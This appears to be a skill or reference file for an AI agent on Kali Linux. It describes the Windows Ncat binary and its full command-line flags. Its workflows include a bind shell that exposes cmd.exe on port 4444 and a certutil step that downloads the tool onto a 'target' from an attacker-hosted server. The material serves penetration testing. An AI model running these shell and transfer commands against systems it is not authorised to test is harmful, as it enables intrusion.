---
name: ncat-w32
description: A feature-packed networking utility for Windows (distributed via Kali) that reads and writes data across networks using TCP and UDP. Use for port scanning, port redirection, creating backdoors/bind shells, transferring files, and testing network connectivity or SSL/proxy support on Windows targets.
---

# ncat-w32

## Overview
Ncat is a modern reimplementation of Netcat from the Nmap Project. It supports IPv4, IPv6, SSL, and proxying (SOCKS4/HTTP). The `ncat-w32` package specifically provides the Windows executable version of Ncat, stored within the Kali Linux filesystem for deployment to Windows targets during penetration testing. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)

The tool is a Windows resource located on the Kali filesystem. To ensure the package is present:

```bash
sudo apt install ncat-w32
```

The Windows executable is located at: `/usr/share/windows-resources/ncat/ncat.exe`

## Common Workflows

### Transferring to Target
Since this is a Windows binary, you must first move it to the target machine (e.g., via SMB, HTTP, or FTP):
```bash
python3 -m http.server 80
# On Windows Target:
# certutil -urlcache -f http://<kali-ip>/ncat.exe ncat.exe
```

### Simple Bind Shell (Windows)
On the Windows target, listen for a connection and execute `cmd.exe`:
```cmd
ncat.exe -lvp 4444 -e cmd.exe
```

### Encrypted File Transfer
On the receiving end (Windows):
```cmd
ncat.exe -l --ssl --send-only > received_file.txt
```
On the sending end:
```bash
ncat <target-ip> --ssl < file_to_send.txt
```

### Port Redirection
Forward traffic from port 8080 on the local Windows machine to a web server on another host:
```cmd
ncat.exe -l 8080 --sh-exec "ncat.exe example.com 80"
```

## Complete Command Reference

```
ncat [Options] [hostname] [port]
```

### General Options

| Flag | Description |
|------|-------------|
| `-4` | Use IPv4 only |
| `-6` | Use IPv6 only |
| `-U`, `--unixsock` | Use Unix domain sockets only |
| `-u`, `--udp` | Use UDP instead of default TCP |
| `-s`, `--source <addr>` | Specify source address to use |
| `-p`, `--source-port <port>` | Specify source port to use |
| `-g <hop1[,hop2,...]>` | Loose source routing hop points (8 max) |
| `-G <ptr>` | Loose source routing hop pointer (4, 8, 12, ...) |
| `-m`, `--max-conns <n>` | Maximum <n> simultaneous connections |
| `-h`, `--help` | Display help screen |
| `-v`, `--verbose` | Increase verbosity (use twice for more) |
| `-C`, `--crlf` | Use CRLF for EOL sequence |
| `-t`, `--telnet` | Answer Telnet negotiations |
| `-n`, `--nodns` | Do not resolve hostnames via DNS |
| `-o`, `--output <file>` | Dump session data to a file |
| `-x`, `--hex-dump <file>` | Dump session data as hex to a file |
| `--append-output` | Append rather than clobber specified output files |
| `--idle-timeout <time>` | Idle timeout for established connections |
| `--recv-only` | Only receive data, never send |
| `--send-only` | Only send data, never receive |
| `--no-shutdown` | Continue receiving after EOF on stdin |
| `-d`, `--delay <time>` | Wait between read/writes |
| `-w`, `--wait <time>` | Connect timeout |
| `-i`, `--idle-timeout <time>` | Idle timeout for established connections |
| `--version` | Display Ncat's version information |

### Connect Mode Options

| Flag | Description |
|------|-------------|
| `--proxy <addr[:port]>` | Specify address of host to proxy through |
| `--proxy-type <type>` | Specify proxy type ("http" or "socks4") |
| `--proxy-auth <auth>` | Authenticate with HTTP or SOCKS proxy server |

### Listen Mode Options

| Flag | Description |
|------|-------------|
| `-l`, `--listen` | Bind and listen for incoming connections |
| `-k`, `--keep-open` | Accept multiple connections in listen mode |
| `--broker` | Enable Ncat's connection brokering mode |
| `--chat` | Start a simple Ncat chat server |
| `--allow <addr[,addr,...]>` | Allow only given hosts to connect to Ncat |
| `--allowfile <file>` | A file of hosts allowed to connect to Ncat |
| `--deny <addr[,addr,...]>` | Deny given hosts from connecting to Ncat |
| `--denyfile <file>` | A file of hosts denied from connecting to Ncat |

### Command Execution Options

| Flag | Description |
|------|-------------|
| `-e`, `--exec <cmd>` | Executes the specified command |
| `-c`, `--sh-exec <cmd>` | Executes the specified command via /bin/sh (or cmd.exe) |
| `--lua-exec <file>` | Executes the specified Lua script |

### SSL Options

| Flag | Description |
|------|-------------|
| `--ssl` | Connect or listen with SSL |
| `--ssl-cert <file>` | Specify SSL certificate file (PEM) for listening |
| `--ssl-key <file>` | Specify SSL private key file (PEM) for listening |
| `--ssl-verify` | Verify trust and domain name of certificates |
| `--ssl-trustfile <file>` | PEM file containing trusted SSL certificates |

## Notes
- The `ncat-w32` package is a wrapper for the Windows binary. The actual executable is found at `/usr/share/windows-resources/ncat/ncat.exe`.
- Unlike the original Netcat, Ncat allows for multiple simultaneous connections using the `-k` or `--keep-open` flag.
- When using `-e` or `-c` on Windows, ensure you point to `cmd.exe` or a valid executable path.